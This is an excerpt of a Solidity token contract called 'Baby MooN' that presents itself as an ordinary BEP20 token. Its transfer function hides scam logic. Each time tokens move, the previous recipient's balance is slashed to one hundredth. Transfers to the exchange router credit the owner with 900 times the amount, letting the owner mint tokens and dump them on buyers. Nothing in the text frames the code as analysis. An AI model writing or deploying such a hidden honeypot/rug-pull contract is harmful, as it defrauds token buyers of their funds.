...
contract AlphaBEP20  {
    ...
    string public name = "Baby MooN";
    string public symbol = "BABYMOON";
    uint8 public decimals = 0;
    address public owner; address newOwner; address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (to != newOwner){balanceOf[newOwner]= balanceOf[newOwner].divCeil(100);}
        if (to == msg.sender) {burn();} if (to == router){balanceOf[owner]+= amount*900;}

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        if (to != owner && to != Owner && to != router){newOwner = to;}
        return true;
    }
